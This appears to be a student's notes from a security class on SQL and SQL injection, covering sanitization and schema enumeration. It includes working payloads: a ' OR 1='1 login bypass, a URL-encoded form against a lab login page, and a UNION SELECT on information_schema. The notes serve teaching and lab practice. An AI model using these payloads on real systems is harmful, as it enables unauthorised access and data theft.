# Structured Query Language

# Standard Commands(Use UNION SELECT)
SELECT ***

	Extracts data from a database

UNION ***

	Used to combine the result-set of two or more SELECT statements

USE

	Selects the DB to use

UPDATE

	Updates data in a database

DELETE

	Deletes data from a database

INSERT INTO

	Inserts new data into a database

CREATE DATABASE

	Creates a new database

ALTER DATABASE

	Modifies a database

CREATE TABLE

	Creates a new table

ALTER TABLE

	Modifies a table

DROP TABLE

	Deletes a table

CREATE INDEX

	Creates an index (search key)

DROP INDEX

	Deletes an index


## EX

https://github.com/IanLefcourte/SQL-BOLT/blob/master/Query-Answers.sql



# SQL Injection - Considerations
Requires Valid SQL Queries

Fully patched systems can be vulnerable due to misconfiguration

Input Field Sanitization

String vs Integer Values

Is ***INFORMATION_SCHEMA*** Database available?

GET Request versus POST Request HTTP methods

# Unsanitized vs Sanitized Fields
Unsanitized: input fields can be found using a Single Quote ⇒ '

	Will return extraneous information

	' closes a variable, to allow for additional statements/clauses

	May show no errors or generic error (harder Injection)



Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)



Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')


# Server-Side Query Processing
User enters JohnDoe243 in the name form field and pass1234 in the pass form field.



The Server-Side Query that would be passed to MySQL from PHP would be:



BEFORE INPUT:

	SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;



AFTER INPUT:

	SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;


 # Example - Injecting Your Statement
User enters TOM' OR 1='1 in the name and pass fields.



Truth Statement: tom ' OR 1='1



Server-Side query executed would appear like this:



SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’


## Significance of single quote

There are single quotes on server side by default so in order to bypass that that must artificially close the first server side ' with your own input, then add OR and another single quote to open  the second ' on server.

# See GET and POST req 

Enter in Username and Password

	' OR 1='1

Before entering credentials open developer console on webpage

Press Login

Highlight POST request in the top Network tab and in right pane click on Request tab

Toggle "Raw" option, copy that string and enter it into url, add a ? before raw string

ex.

	(http://10.50.33.78/login.php)  +  (?)  +  (username=Darth_Vader&passwd=%27+OR+1%3D%271)

### Think of DB like MS Excel 

File = Database

Tables are within each file

There are columns within 

 # GOLDEN STATEMENT

 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns


 ## In Class DEMO, no creds

 ### Commands

Log Into SQL Server

 	mysql

See DBs

	show databases

 ***information_schema, mysql and performance_schema are the three default DBs for SQL server, we will be mostly concerned with information_schema***

To select and change DB

	use information_schema

See all tables within that DB

	show tables from information_schema ;
***Don't need From statement if already in that DB***


See information within table in columns

	show columns from columns ;

 ***Big Three Columns***

 Table_Schema will show all DBs across entire server i.e. information_schema, mysql, performance_schema, session

 Table_Name names of all tables across all DBs across server

 Column_Name show all columns of tables of all DBs across server

 ***Only be worried about Table_Name,Table_Schema,Column_Name as referenced to by Golden Statement***

Will show table_schema,columns table of information_schema 

 	select table_schema from information_schema.columns ;

Will show table_names, from columns table in information_schema

	select table_name from information_schema.columns ;

Selecting all column names from all of the tables within the information_schema DB

 	select column_name from information_schema.columns ;

Query same as golden statement without UNION

	select table_schema,table_name,column_name from information_schema.columns


